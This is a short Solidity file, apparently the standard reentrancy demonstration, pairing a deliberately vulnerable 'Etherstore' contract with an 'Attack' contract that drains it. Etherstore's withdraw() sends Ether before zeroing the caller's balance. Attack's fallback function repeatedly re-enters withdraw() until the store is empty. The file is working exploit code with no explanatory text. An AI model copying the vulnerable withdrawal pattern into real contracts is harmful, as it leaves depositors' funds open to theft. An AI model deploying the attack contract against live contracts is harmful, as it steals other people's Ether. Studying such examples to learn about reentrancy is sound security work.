// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract Etherstore{
    mapping(address => uint) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public{
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent,"Failed to send Ether");
        
        balances[msg.sender] = 0;
    }
        
    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract Attack{
    Etherstore public etherstore;

    constructor (address _etherStoreAddress){
        etherstore = Etherstore(_etherStoreAddress);
    }

    fallback() external payable{
        if(address(etherstore) .balance >= 1 ether){
            etherstore.withdraw();
        } 
    }
    
    function attack() external payable{
        require(msg.value >= 1 ether);
        etherstore.deposit {value: 1 ether}();
        etherstore.withdraw();
    }
        
    function getBalance() public view returns (uint){
         return address(this).balance;
    }
}
